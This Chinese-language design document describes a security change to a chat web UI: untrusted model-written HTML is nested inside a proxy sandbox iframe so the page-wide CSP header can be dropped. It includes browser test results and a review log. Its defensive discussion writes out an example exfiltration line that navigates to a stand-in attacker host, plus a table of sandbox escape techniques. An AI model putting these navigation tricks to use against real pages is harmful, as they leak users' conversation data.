# 不可信页面的嵌套沙箱：把隔离从整页 CSP 移到框架自身

> 状态：已实现（v0.9.105）· 2026-10-21 · 范围：`lovia/web`（不改 core）
>
> 行号指向 v0.9.104（`129d31d`）。浏览器行为在 Chromium 145 与 WebKit 26 上实测（§3）；Firefox 未能在本机自动化，合并前需手动验证（§7）。修订的是 [web-html-component.md](web-html-component.md) 的“决策 1”。

## 结论

聊天页今天发送 `Content-Security-Policy: frame-src 'none'`（[ui.py:239](../../lovia/web/ui.py#L239)），用来阻止模型写的沙箱页面把自己导航到外部地址、带走数据。代价是部署方在模板或扩展里放的任何 iframe 都被拦下，而且无法放宽：CSP 是整页一条规则，分不清哪个框架可信。

本方案在每个不可信页面外套一层 lovia 自己写的**代理框架**，由代理的 `frame-src 'none'` 约束它里面那一层的导航，然后**去掉聊天页的 CSP 响应头**：

```
聊天页（不再发送 CSP）
 └─ 代理 srcdoc：lovia 编写；meta CSP frame-src 'none'；把内层消息原样转发给父页面
     └─ 不可信页面 srcdoc：sandbox="allow-scripts" + 自身 FRAME_CSP（与今天相同）
```

- 安全性不变：今天能拦住的导航，嵌套后同样拦住（§3 的 10 种手法）。
- 部署方零配置：模板和扩展里的 iframe 直接可用，也没有“白名单里的源变成泄漏目的地”这种取舍。
- 规则跟着不可信内容走：判断安全性只需看一个工具函数，不再依赖“整页 CSP 没被改过”。
- 与 MCP Apps 的宿主结构一致（宿主同样用一层沙箱代理承载 UI），以后渲染 MCP 服务器的 `ui://` 资源可以复用。

## 1. 问题

### 1.1 为什么今天需要整页 CSP

不可信页面有两处：`html` 组件（[html.js:179](../../lovia/web/static/js/html.js#L179)）和文件面板对 HTML 文件的预览（[files.js:957](../../lovia/web/static/js/files.js#L957)）。两者都是 `sandbox="allow-scripts"` 的 srcdoc 框架：不透明源，拿不到 cookie、存储和父页面 DOM。`html` 组件的 srcdoc 还以 `FRAME_CSP`（`default-src 'none'` 等）开头，挡住了 `fetch` 和子资源。

剩下的一条路是**导航**：CSP 没有约束“文档导航自己”的指令（`navigate-to` 已从规范中移除）。页面执行 `location = "https://evil.example/?d=…"`，数据就随 URL 离开。框架的导航受**嵌入它的文档**的 `frame-src` 约束，所以 lovia 在聊天页上设了 `frame-src 'none'`（[web-html-component.md](web-html-component.md) 的 spike 已验证；srcdoc 框架本身不受 `frame-src` 限制，照常加载）。

### 1.2 代价

- **部署方的 iframe 一律被拦**：嵌入已有测试平台、Grafana、Dify 智能体这类需求做不了。设计文档当时写的是：“`ChatUI(frame_src=…)` 等有人提再加”。现在有人提了（基于 lovia web 搭测试平台，需要嵌入其他平台）。
- **开关解决不好这个问题**：`frame_src` 白名单里的每个源，同时也是模型页面能导航过去的目的地。比如允许了 `grafana.internal`，模型页面就能导航到 `https://grafana.internal/?q=<对话内容>`，数据落进 Grafana 的访问日志。部署方得在“能嵌入”和“多一个泄漏面”之间二选一。
- **安全性依赖整页状态**：部署方只要用中间件改写或覆盖了这个响应头（我们在测试平台示例里就这么做过），不可信页面的防护就悄悄失效，而这件事在 `html.js` 里看不出来。

## 2. 方案对比

| 方案 | 部署方嵌入 iframe | 模型页面的导航面 | lovia 改动 |
| --- | --- | --- | --- |
| A. 维持现状 | 不能 | 无 | 无 |
| B. `ChatUI(frame_src=[…])` 白名单 | 能（逐个配置） | 白名单里的每个源 | 一个字段 |
| C. 不可信页面放到另一个源（如 `usercontent` 子域） | 能 | 无 | 需要第二个域名和部署配置，不适合单进程、内网、子路径部署 |
| C′. 在 iframe 上用 `csp` 属性（CSP Embedded Enforcement） | 能 | 无 | 只有 Chromium 实现 |
| **D. 嵌套沙箱，去掉整页 CSP** | **能（零配置）** | **无** | 一个约 30 行的工具函数，两处调用 |

B 是在症状层面加旋钮：它把一个安全取舍交给部署方，而且每加一个源，模型页面的风险就上升一点。D 消除了取舍本身：不可信页面的导航由它的直接父级（代理）约束，与聊天页无关。C 能达到同样的隔离，但要求额外的源，违背 lovia web“一个进程、一个端口、可挂在子路径下”的部署模型。

## 3. 实测（Chromium 145、WebKit 26）

父页面**不设任何 CSP**；同一页面上另放一个指向第二个源的普通 iframe（模拟部署方嵌入）。不可信页面带今天的 `FRAME_CSP`，在加载 150 ms 后尝试一种逃逸。泄漏 = 第二个源收到了请求。

| 逃逸手法 | 单层沙箱（今天去掉整页 CSP 后） | 嵌套沙箱 |
| --- | --- | --- |
| `location.href = …` | **泄漏** | 拦住 |
| 插入 `<meta http-equiv=refresh>` | **泄漏** | 拦住 |
| 点击链接 | **泄漏** | 拦住 |
| 提交 GET 表单 | 拦住（无 `allow-forms`） | 拦住 |
| 导航父页面 / 顶层页面 | 拦住（沙箱） | 拦住（沙箱） |
| `window.open` | 拦住（无 `allow-popups`） | 拦住 |
| 再嵌一层 iframe、`<img>`、`fetch` | 拦住（`FRAME_CSP`） | 拦住 |

两个引擎结果完全一致。另外验证了：

- **代理的策略不收紧内层**：内层的 `data:` 图片照常加载（内层会继承代理的策略容器，所以代理只放 `frame-src 'none'` 一条，不放 `default-src`）。
- **消息转发正常**：内层 `parent.postMessage` → 代理按 `event.source` 校验后转发 → 父页面按 `event.source === 代理.contentWindow` 校验。
- **发送检查不变**：在内层真实点击后，父页面看到 `document.activeElement === 代理框架`、`navigator.userActivation.isActive === true`；没有点击时由定时器发出的消息，两者都是 `false`。与今天单层时的结果相同，所以 [html.js](../../lovia/web/static/js/html.js) 里“焦点在框架内 + `ctx.send` 的用户激活”这道检查无需改动，只是比较对象从内层框架换成代理框架。
- **部署方的跨源 iframe** 在两种结构下都正常加载（父页面没有 CSP）。

实验脚本放在本 PR 描述里，便于复现。

## 4. 设计

### 4.1 `sandbox.js`

新模块，`html.js` 和 `files.js` 共用：

```js
/**
 * An iframe that runs `doc` untrusted: an opaque-origin srcdoc nested in a
 * proxy whose `frame-src 'none'` stops it navigating anywhere. Messages the
 * page posts to its parent are relayed, so they arrive from the returned
 * frame's window.
 */
export function sandboxFrame(doc, { title, className }) → HTMLIFrameElement
export function proxyDoc(doc, title) → string   // 纯函数，供单测
```

代理文档：

```html
<!doctype html><meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="frame-src 'none'">
<style>html,body{margin:0;height:100%;overflow:hidden}iframe{display:block;border:0;width:100%;height:100%}</style>
<iframe sandbox="allow-scripts" referrerpolicy="no-referrer" title="…" srcdoc="…转义后的 doc…"></iframe>
<script>
  const f = document.querySelector('iframe');
  addEventListener('message', (e) => { if (e.source === f.contentWindow) parent.postMessage(e.data, '*'); });
</script>
```

- 外层（代理）同样 `sandbox="allow-scripts"`：代理本身也是不透明源，就算出错也碰不到聊天页。沙箱标志会向下继承，内层不可能比代理更宽。
- 内层文档放在代理的 `srcdoc` 属性里，用 `escapeHtml` 转义（覆盖 `& < > " '`），不需要握手，也没有异步窗口。
- 只转发内层 → 父页面一个方向。今天父页面从不向页面发消息，所以不需要反向通道。
- 代理的 CSP 只有 `frame-src 'none'`。若加上 `default-src`，内层会继承并取交集，文件预览里 HTML 引用的图片会被额外拦下，这不是本方案要改变的行为（见 §6）。

### 4.2 调用方

- `html.js`：`run()` 里用 `sandboxFrame(doc(), { title, className: 'html-frame' })` 代替手工创建 iframe；`listenToFrame(frame, …)` 不变（监听的是代理窗口）；`--page-height` 设在代理框架上，内层铺满代理。下载 HTML 仍是内层文档本身（带 `FRAME_CSP`），不含代理。
- `files.js`：HTML 预览改用 `sandboxFrame(v.content, { title: v.name, className: 'files-frame files-frame--html' })`。
- `bootstrap` 里“取消非锚点链接点击”的逻辑保留：被拦的导航会把内层换成错误页，取消点击仍然是更好的体验。注释里的理由从“聊天页禁止导航”改为“代理禁止导航”。

### 4.3 聊天页

删除 [ui.py:236-239](../../lovia/web/ui.py#L236) 的响应头及注释。lovia 不再为聊天页设置 CSP：页面级策略属于部署方，lovia 只约束它自己渲染的不可信内容。

部署方若自己给页面加 CSP，文档写明两点：

- `frame-src` 按自己的嵌入需求填写即可，不影响 lovia 的 srcdoc 框架（srcdoc 不受 `frame-src` 约束，§1.1）；
- srcdoc 框架继承页面的策略。lovia 的页面本身就有内联脚本（[index.html:17](../../lovia/web/templates/index.html#L17) 的主题脚本），所以页面级 `script-src` 本来就必须允许内联；不允许的话，聊天页和不可信页面都会失效，这一点与本方案无关，今天也是如此。

### 4.4 其余防线不变

- Markdown 经 DOMPurify 净化，默认去掉 `<iframe>`（[util.js:42](../../lovia/web/static/js/util.js#L42)），模型回复里写 iframe 不会生效；
- Mermaid 以 `securityLevel: 'strict'` 渲染（[diagrams.js:27](../../lovia/web/static/js/diagrams.js#L27)），不产生框架；
- PDF 预览用 `<embed>`，受 `object-src` 而非 `frame-src` 约束，去掉整页 CSP 前后行为相同；
- 扩展脚本和模板 block 是部署方的代码，本来就受信任。

所以去掉整页 CSP 不会让任何不可信内容多出导航能力。

## 5. 明确不做

| 提议 | 原因 |
| --- | --- |
| 同时提供 `ChatUI(frame_src=…)` | 去掉整页 CSP 之后没有需要它的场景；想要页面级 CSP 的部署方用自己的中间件或反向代理，策略完全由他们决定 |
| 代理改用一个服务端路由（带 CSP 响应头） | meta 下发的 `frame-src` 在两个引擎上都已生效，srcdoc 免去一次请求、子路径和鉴权问题。若 Firefox 验证失败再改用路由，结构不变 |
| 借机收紧文件预览的子资源 | 文件预览的子资源一直是开放的（web-html-component.md 的 Deferred），收紧会改变现有行为，另行处理 |
| 父页面向内层发消息的通道 | 今天没有使用者 |

## 6. 风险

- **Firefox 未验证**（本机 Playwright Firefox 无法启动）。合并前用 §3 的脚本在 Firefox 上手动跑一遍；如果 meta 方式不生效，改用 §5 提到的服务端路由下发代理文档。
- **多一层框架的开销**：每张 `html` 卡片和每次 HTML 预览多一个文档，内存开销很小；重新打开聊天时 `html` 卡片仍要点击“运行”才启动，不会同时创建大量框架。
- **内层直接给顶层页面发消息**：内层可以拿到 `top` 并 `postMessage`，但父页面只接受 `event.source === 代理.contentWindow` 的消息，这类消息会被丢弃（与今天检查 `frame.contentWindow` 的逻辑相同）。

## 7. 实施与验证

一个 PR：

1. 新增 `static/js/sandbox.js`；`html.js`、`files.js` 改用它；更新 `html.js` 顶部注释。
2. `ui.py` 删除 CSP 响应头。
3. 测试：
   - `tests/web/js/sandbox.test.mjs`：代理文档里 `frame-src 'none'` 出现在内层 iframe 之前；内层文档中的 `"`、`&` 等无法跳出 `srcdoc` 属性；代理只转发来自内层窗口的消息；
   - `tests/web/test_html.py`：原来断言 CSP 头存在的测试，改为断言聊天页**不**发送 CSP（防止有人以为它还承担防护职责而加回去）。
4. 端到端（verify skill，Chromium）：`show_html` 页面正常显示、高度跟随、“运行”按钮、点击按钮 `lovia.send` 生效、定时器发送被拒；文件面板 HTML 预览正常；模板里放一个跨源 iframe 能加载。
5. Firefox 手动跑 §3 脚本。
6. 文档：更新 `web-html-component.md`（“The chat page's `frame-src 'none'`”一节、决策 1、spike 表）；`web-server.md`（中英文）的“定制页面”补一句部署方可直接嵌入 iframe 及自定义 CSP 的说明。

## 审查记录

初稿完成后逐条做了对抗性审查，以下问题已并入正文：

| # | 发现 | 处理 |
| --- | --- | --- |
| 1 | 还有没有更小的方案？iframe 的 `csp` 属性可以直接约束框架 | 只有 Chromium 实现，列入 §2 作为否决项 |
| 2 | 部署方给页面加严格 CSP 时，srcdoc 继承策略，代理的转发脚本会被拦 | 与今天相同（页面本身就有内联脚本），在 §4.3 写明 |
| 3 | 内层能否借 `<a target=_parent>`、表单 `target` 导航代理？ | 沙箱框架只能导航自己和后代（无 `allow-top-navigation`），导航父级被拒；实验里 `parent.location` 一项覆盖了同一条规则 |
| 4 | 内层可以直接向顶层页面 `postMessage`，绕过代理 | 父页面按 `event.source === 代理.contentWindow` 过滤，直接发来的消息被丢弃（§6） |
| 5 | 代理若加 `default-src`，内层继承后取交集，文件预览会被额外收紧 | 代理只放 `frame-src 'none'`（§4.1），实验确认内层 `data:` 图片照常加载 |
| 6 | 去掉整页 CSP 会不会让别处的不可信内容多出能力？ | 逐一排查 Markdown、Mermaid、PDF 预览、扩展与 block（§4.4），没有依赖它的地方 |
| 7 | 过度设计检查：是否需要服务端路由承载代理、反向消息通道 | 都不需要（§5）；路由只在 Firefox 验证失败时作为后备 |
| 8 | Firefox 未验证 | 列为合并前的必做项（§6、§7） |
